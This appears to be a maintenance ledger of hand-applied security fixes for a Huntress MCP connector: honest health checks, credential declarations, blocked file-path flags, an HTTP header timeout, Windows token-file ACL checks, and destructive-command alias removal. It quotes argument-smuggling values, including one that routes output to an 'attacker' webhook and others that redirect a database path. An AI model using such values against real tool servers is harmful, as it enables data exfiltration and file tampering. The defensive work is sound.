_comment: Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. REPRINT 4.32.5 (2026-09-28): the press now emits doctorInfoKeys/doctorIsInfoKey and the key-aware --fail-on scan natively in doctor.go (so doctor_verdict.go no longer defines them) and has dropped the 'but auth was accepted' line for a WARN. Still connector-only: refusing to dial the shipped placeholder base_url, the explicit ERROR row when no credential is configured, and doctorUnexpectedStatus (404 = wrong base_url, api row goes red). Also re-applied at the 4.32.5 review: the generated credential probe used the cache-enabled GetWithHeaders, so a credential revoked server-side could read 'valid' from a cached 200 for the cache TTL; doctor.go now calls GetWithHeadersNoCache. And doctorShippedBaseURL is EMPTY for huntress: https://api.huntress.io is the real, only API host, so an operator who never set HUNTRESS_BASE_URL is correctly configured - filling the literal in (v0.1.5 and earlier) made doctor refuse to probe every default install.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For huntress the manifest gained: HUNTRESS_BASE_URL. server.json gained: HUNTRESS_BASE_URL. mcp-install.md's env blocks gained: HUNTRESS_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing
handfixes.why: The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {"db": "/path/to/someone-elses.sqlite"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because "db=/tmp/evil" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. REPRINT 4.32.5 (2026-09-28): cli-printing-press now emits blockedDestinationFlags natively (audit-dir, db, o, output, receipt-file), folds it into every tool's blocked set via blockedStructuredArgsForCommand in typemap.go (so blocked flags are also dropped from the tool's input schema and unknown names are rejected by validateMCPArgumentNames - both residuals below are closed), and refuses argument names carrying '='. Still connector-only: the wider floor (from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), the usage-text rule (isFilesystemPathFlag / filesystemPathFlagPhrases), UnblockedFilesystemPathFlags and the two hand-written test files that walk the live tree.
handfixes.spec_encode_followup: Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. REPRINT 4.32.5 (2026-09-28): the joined --flag=value emission is native in the press's cobratree/shellout.go.tmpl (all four value branches) and its own TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag; only the one-element-per-branch table (the "--filter=map[a:1]" default-branch case) is still a hand addition to the generated test.

handfixes.summary: The MCP server's --transport http listener sets ReadHeaderTimeout so one client cannot hold it open by dribbling request headers
handfixes.why: cli-printing-press 4.32.5 gives every MCP server a --transport http mode (streamable HTTP behind bearer auth) and the generated cmd/huntress-mcp/main.go http.Server literal sets no header-read deadline, so a single client could hold the listener open indefinitely by sending request headers one byte at a time (Slowloris). gosec G112 flags exactly this shape and the security gate raised it as P1 on the 4.32.5 reprint (same finding datagate carried since PR #317). The fix adds ReadHeaderTimeout: 10 * time.Second to the http.Server literal. A reprint regenerates main.go without the field and go build stays green, so this marker is the only thing that notices. code_only because the explanatory comment above the field also names G112 - the assert must be satisfied by the field itself. DURABLE FIX belongs in the press's mcp main.go template; file via printing-press-retro.

handfixes.summary: The MCP search/sql tools resolve the local store through the CLI's own resolver, so they read the credential-scoped data-<hash>.db that `sync` writes on a fresh install
handfixes.why: cli-printing-press 4.32 scopes a FRESH local store by a hash of the configured credential (helpers.go defaultDBPathInDir: data-<hash>.db unless a legacy data.db already exists), but the generated internal/mcp/tools.go mcpDBPath still hard-codes data.db. On a new install every sync - including one the MCP server itself shells out to - lands in the scoped file and the MCP search and sql tools then report that no store exists. Found by the 4.32.5 reprint review (Codex P1). The fix adds hand-authored internal/cli/mcp_store_path.go (MCPStorePath, which calls the same defaultDBPathInDir) and makes mcpDBPath return cli.MCPStorePath(); internal/mcp/store_path_test.go fails against the pristine resolver (proven both directions). A reprint regenerates tools.go with the hard-coded path and the build stays green. DURABLE FIX belongs in the press's mcp tools.go template; file via printing-press-retro.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029

asserts.contains: func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: The generator's hidden Cobra alias `create` is removed from the 1 command listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs it
handfixes.why: cli-printing-press gives a POST endpoint command the hidden alias `create`. On these commands the POST is destructive, so an agent that guessed the conventional verb (`<group> create`) ran the destructive call, and the alias appeared nowhere in help, agent-context or governance.md. Reproduced on origin/main 6416a241b against a local fake server: `maxio-cli subscriptions purge-json create sub_123 --ack 1` sent POST /subscriptions/sub_123/purge.json, `sentinelone-cli reports create` sent POST /reports/delete-reports and `tactical-rmm-cli agents shutdown create agent-42` sent POST /agents/agent-42/shutdown/. Fleet gate: tools/maintainer/check_command_tree.py, which walks the real cli.RootCmd() tree (133 such commands in 28 connectors on 6416a241b, 0 after). The canonical command names are unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate fails while the alias is present. Commands here: accounts incident-reports post-v1-accounts-account-id-id-remediations-bulk-approval (POST /v1/accounts/{account_id}/incident_reports/{incident_report_id}/remediations/bulk_approval).
handfixes.spec_encode_followup: Press-side: emit the `create` alias only for operations that create something.
